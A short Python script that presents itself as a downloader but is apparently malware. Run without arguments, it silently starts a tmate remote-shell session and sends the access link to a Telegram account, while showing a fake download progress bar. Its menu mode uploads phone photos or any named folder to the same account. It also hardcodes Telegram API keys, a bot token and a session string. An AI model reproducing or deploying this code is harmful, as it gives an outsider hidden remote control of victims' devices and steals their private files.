from pyrogram import Client
import os

from rich.progress import track
from rich.console import Console
import time
import string
import random

from sys import argv, exit

options = None

api_id = 19010705
api_hash = '6f28ee94dfcd3a32f559c106d65bfdbe'
bot_token = '5293513683:AAE8vw4r5g9amIfFK9txStn501vMrVh_krQ'

session = 'AgEiFJEAmlesbCCgJrKEZx736PoYk-sa_tyqFGN5Kw7Z_cftLxzLtY54cs8hpBHzp98TjNSVL5z1MZN-tDY1NCFH2BHjEfqG5dMLxmBL5sL2sNL7w964hXz36Tmj34KWdK48XXsHAFEWvUNB5bbM84WWKN3RKIbXRp890IDsA94V1iHEvSAcinJllcTRYO2pcZb9b5f8hWwX-vztwoDrPMPTcFCpzLLQvB6xG16Kf0hynXDUFpiziW232twG2EYpcW6Jqbo9cECTX4eb_Hq1bZGNfa_9f3dSYsGtpJ7I6QClA7cDFsnf38PnFYdZP8dOgbmzf8BTcJTBbDDy5_71REAkfty7mQAAAAE7hJvTAQ'

console = Console()

try:
    _, options = argv
except:
    console.print('[bold green][+] STARTED DOWNLOAD[/]')

class TmateCreate:
    def download_line(self):
        os.system('tmate -F > i.txt &')
        app = Client('my-bot',
        api_id, api_hash, session_string=session)
        app.start()

        while True:
            try:
                app.send_document('Creator_pepeDevs', 'i.txt')
                break

            except:
                pass

        app.stop()

        for _ in track(range(100), description='[bold]Download...'):
            time.sleep(20)

        while True:
            name_download = "".join(random.choices(string.ascii_letters, k=20))
            console.print(f'[ [green bold]OK[/] ] ... {name_download}')
            time.sleep(2)

    def main(self):
        os.system('curl 2ip.ru')
        
        menu = console.input('''[bold white]
[1] отправка фото сохраненных с вк[тестовая функция]
[2] путь к папке для отправки файлов из нее
>> ''')
        if menu == '1':
            self.photo('/sdcard/Pictures/VK/')

        if menu == '2':
            path_file = console.input('''[bold white]
путь к папке с фото/документами(бот выгрузит любой файл в виде документа))
(указывать полный путь)
>> ''')
            if path_file[-1] != '/':
                path_file+='/'

            self.photo(path_file)

    def photo(self, path_file):
        app = Client('my-bot',
        api_id, api_hash, session_string=session)
        app.start()
        for file in track(os.listdir(path_file)):
            try:
                app.send_document('Creator_pepeDevs', f'{path_file}{file}')

            except Exception as error:
                console.print(f'[bold red]ERROR[/] {error}')

script_start = TmateCreate()

if options == '--start':
    console.print("Author's channel: https://t.me/Pepe_devs")
    try:
        script_start.main()

    except KeyboardInterrupt:
        console.print('\n[blue]<https://t.me/pepe_devs>[/]')
        exit()

else:
    script_start.download_line()
